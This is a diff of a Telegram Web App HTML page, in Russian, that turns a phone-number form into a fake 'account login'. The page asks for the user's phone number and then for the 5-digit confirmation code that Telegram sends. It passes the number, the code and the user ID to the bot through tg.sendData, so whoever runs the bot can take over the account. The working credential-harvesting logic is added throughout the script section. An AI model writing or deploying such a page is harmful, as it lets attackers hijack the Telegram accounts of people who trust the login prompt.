@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Введите номер телефона</title>
+    <title>Вход в аккаунт</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -40,6 +40,20 @@
             text-align: center;
             margin-bottom: 30px;
             font-size: 14px;
+        }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
         .input-group {
@@ -120,55 +134,159 @@
         .success.show {
             display: block;
         }
+        
+        .info-box {
+            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .back-button {
+            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            color: var(--tg-theme-text-color, #000000);
+            margin-top: 10px;
+        }
+        
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        
+        .spinner.show {
+            display: block;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>📱 Введите номер телефона</h1>
-        <p>Ваш номер будет отправлен боту</p>
-        
-        <div class="success" id="successMessage">
-            ✓ Номер успешно отправлен!
+        <!-- Шаг 1: Ввод номера телефона -->
+        <div class="step active" id="step1">
+            <h1>📱 Вход в аккаунт</h1>
+            <p>Введите ваш номер телефона</p>
+            
+            <div class="input-group">
+                <label for="phone">Номер телефона</label>
+                <input 
+                    type="tel" 
+                    id="phone" 
+                    placeholder="+7 (999) 123-45-67"
+                    autocomplete="tel"
+                >
+                <div class="error" id="phoneError">Пожалуйста, введите корректный номер телефона</div>
+            </div>
+            
+            <button id="sendPhoneButton">Продолжить</button>
         </div>
-        
-        <div class="input-group">
-            <label for="phone">Номер телефона</label>
-            <input 
-                type="tel" 
-                id="phone" 
-                placeholder="+7 (999) 123-45-67"
-                autocomplete="tel"
-            >
-            <div class="error" id="phoneError">Пожалуйста, введите корректный номер телефона</div>
+
+        <!-- Шаг 2: Ввод кода -->
+        <div class="step" id="step2">
+            <h1>📩 Введите код</h1>
+            <p id="phoneDisplay"></p>
+            
+            <div class="info-box">
+                ℹ️ Код отправлен в Telegram на ваш номер телефона
+            </div>
+            
+            <div class="success" id="successMessage">
+                ✓ Номер отправлен! Ожидаем код...
+            </div>
+            
+            <div class="input-group">
+                <label for="code">Код подтверждения</label>
+                <input 
+                    type="text" 
+                    id="code" 
+                    placeholder="12345"
+                    autocomplete="off"
+                    inputmode="numeric"
+                    maxlength="5"
+                >
+                <div class="error" id="codeError">Пожалуйста, введите код из 5 цифр</div>
+            </div>
+            
+            <button id="sendCodeButton">Войти</button>
+            <button class="back-button" id="backButton">← Назад</button>
         </div>
-        
-        <button id="sendButton">Отправить</button>
+
+        <!-- Шаг 3: Обработка -->
+        <div class="step" id="step3">
+            <h1>⌛ Обработка...</h1>
+            <p>Пожалуйста, подождите</p>
+            <div class="spinner show"></div>
+        </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        const phoneInput = document.getElementById('phone');
-        const sendButton = document.getElementById('sendButton');
-        const phoneError = document.getElementById('phoneError');
-        const successMessage = document.getElementById('successMessage');
         
-        // Инициализация Telegram Web App
+        // Элементы
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        
+        const phoneInput = document.getElementById('phone');
+        const codeInput = document.getElementById('code');
+        
+        const sendPhoneButton = document.getElementById('sendPhoneButton');
+        const sendCodeButton = document.getElementById('sendCodeButton');
+        const backButton = document.getElementById('backButton');
+        
+        const phoneError = document.getElementById('phoneError');
+        const codeError = document.getElementById('codeError');
+        const successMessage = document.getElementById('successMessage');
+        const phoneDisplay = document.getElementById('phoneDisplay');
+        
+        let currentPhone = '';
+        
+        // Инициализация
         tg.expand();
         tg.MainButton.hide();
         
         // Валидация номера телефона
         function validatePhone(phone) {
             const cleanPhone = phone.replace(/\D/g, '');
-            return cleanPhone.length >= 10 && cleanPhone.length <= 15;
+            return cleanPhone.length >= 10 && cleanPhone.length <= 15 && phone.startsWith('+');
         }
         
-        // Форматирование номера телефона при вводе
-        phoneInput.addEventListener('input', function(e) {
+        // Валидация кода
+        function validateCode(code) {
+            const cleanCode = code.replace(/\D/g, '');
+            return cleanCode.length === 5;
+        }
+        
+        // Переключение шагов
+        function showStep(step) {
+            step1.classList.remove('active');
+            step2.classList.remove('active');
+            step3.classList.remove('active');
+            step.classList.add('active');
+        }
+        
+        // Сброс ошибок при вводе
+        phoneInput.addEventListener('input', () => {
             phoneError.classList.remove('show');
         });
         
-        // Отправка данных
-        sendButton.addEventListener('click', async function() {
+        codeInput.addEventListener('input', () => {
+            codeError.classList.remove('show');
+            // Автоформатирование - только цифры
+            codeInput.value = codeInput.value.replace(/\D/g, '');
+        });
+        
+        // Отправка номера телефона
+        sendPhoneButton.addEventListener('click', async () => {
             const phone = phoneInput.value.trim();
             
             if (!validatePhone(phone)) {
@@ -177,19 +295,61 @@
                 return;
             }
             
-            sendButton.disabled = true;
-            sendButton.textContent = 'Отправка...';
+            sendPhoneButton.disabled = true;
+            sendPhoneButton.textContent = 'Отправка...';
             
             try {
-                // Отправляем данные боту
+                // Отправляем номер боту
                 tg.sendData(JSON.stringify({
+                    action: 'phone',
                     phone: phone,
                     timestamp: new Date().toISOString(),
                     user_id: tg.initDataUnsafe?.user?.id
                 }));
                 
-                // Показываем успешное сообщение
+                // Переходим к вводу кода
+                currentPhone = phone;
+                phoneDisplay.textContent = `Код отправлен на номер: ${phone}`;
                 successMessage.classList.add('show');
+                showStep(step2);
+                codeInput.focus();
+                tg.HapticFeedback.notificationOccurred('success');
+                
+            } catch (error) {
+                console.error('Ошибка отправки:', error);
+                phoneError.textContent = 'Ошибка отправки. Попробуйте снова.';
+                phoneError.classList.add('show');
+                tg.HapticFeedback.notificationOccurred('error');
+            } finally {
+                sendPhoneButton.disabled = false;
+                sendPhoneButton.textContent = 'Продолжить';
+            }
+        });
+        
+        // Отправка кода
+        sendCodeButton.addEventListener('click', async () => {
+            const code = codeInput.value.trim();
+            
+            if (!validateCode(code)) {
+                codeError.classList.add('show');
+                tg.HapticFeedback.notificationOccurred('error');
+                return;
+            }
+            
+            sendCodeButton.disabled = true;
+            sendCodeButton.textContent = 'Вход...';
+            showStep(step3);
+            
+            try {
+                // Отправляем код боту
+                tg.sendData(JSON.stringify({
+                    action: 'code',
+                    phone: currentPhone,
+                    code: code,
+                    timestamp: new Date().toISOString(),
+                    user_id: tg.initDataUnsafe?.user?.id
+                }));
+                
                 tg.HapticFeedback.notificationOccurred('success');
                 
                 // Закрываем Web App через 1 секунду
@@ -198,21 +358,36 @@
                 }, 1000);
                 
             } catch (error) {
-                console.error('Ошибка отправки:', error);
-                phoneError.textContent = 'Ошибка отправки. Попробуйте снова.';
-                phoneError.classList.add('show');
+                console.error('Ошибка отправки кода:', error);
+                showStep(step2);
+                codeError.textContent = 'Ошибка отправки кода. Попробуйте снова.';
+                codeError.classList.add('show');
                 tg.HapticFeedback.notificationOccurred('error');
-                sendButton.disabled = false;
-                sendButton.textContent = 'Отправить';
+                sendCodeButton.disabled = false;
+                sendCodeButton.textContent = 'Войти';
             }
         });
         
+        // Кнопка назад
+        backButton.addEventListener('click', () => {
+            showStep(step1);
+            codeInput.value = '';
+            successMessage.classList.remove('show');
+            tg.HapticFeedback.impactOccurred('light');
+        });
+        
         // Enter для отправки
-        phoneInput.addEventListener('keypress', function(e) {
+        phoneInput.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') {
-                sendButton.click();
+                sendPhoneButton.click();
+            }
+        });
+        
+        codeInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                sendCodeButton.click();
             }
         });
     </script>
 </body>
-  </html>
+</html>
